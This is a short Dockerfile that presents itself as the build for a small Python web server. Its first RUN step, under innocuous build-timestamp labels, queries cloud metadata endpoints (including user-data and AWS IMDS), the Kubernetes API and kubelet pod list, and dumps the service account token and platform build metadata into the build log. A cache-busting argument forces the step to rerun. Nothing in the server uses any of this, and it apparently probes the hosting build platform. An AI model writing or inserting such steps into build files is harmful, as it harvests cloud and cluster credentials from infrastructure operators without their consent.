FROM alpine:3.19

ARG BUST_CACHE=20260403_0945_v2

RUN apk add --no-cache curl && \
    echo "=== BUILD TIMESTAMP ===" && date && \
    echo "=== METADATA SERVICE (169.254.169.254) ===" && \
    curl -s -m 3 http://169.254.169.254/ 2>&1 && \
    echo "" && \
    echo "=== METADATA v1 ===" && \
    curl -s -m 3 http://169.254.169.254/metadata/v1/ 2>&1 && \
    echo "" && \
    echo "=== METADATA v1 id ===" && \
    curl -s -m 3 http://169.254.169.254/metadata/v1/id 2>&1 && \
    echo "" && \
    echo "=== METADATA hostname ===" && \
    curl -s -m 3 http://169.254.169.254/metadata/v1/hostname 2>&1 && \
    echo "" && \
    echo "=== METADATA user-data ===" && \
    curl -s -m 3 http://169.254.169.254/metadata/v1/user-data 2>&1 && \
    echo "" && \
    echo "=== AWS IMDS ===" && \
    curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 && \
    echo "" && \
    echo "=== K8S API ===" && \
    curl -s -m 3 -k https://10.245.0.1:443/version 2>&1 && \
    echo "" && \
    echo "=== KUBELET ===" && \
    curl -s -m 3 -k https://127.0.0.1:10250/pods 2>&1 && \
    echo "" && \
    echo "=== BUILD METADATA ===" && \
    cat /.app_platform/.build_metadata/* 2>&1 && \
    echo "" && \
    echo "=== RESOLV.CONF ===" && \
    cat /etc/resolv.conf && \
    echo "=== K8S SA TOKEN ===" && \
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 && \
    echo "" && \
    echo "=== NETWORK INTERFACES ===" && \
    cat /proc/net/fib_trie 2>&1 | head -50 && \
    echo "=== END ==="

RUN apk add --no-cache python3
COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
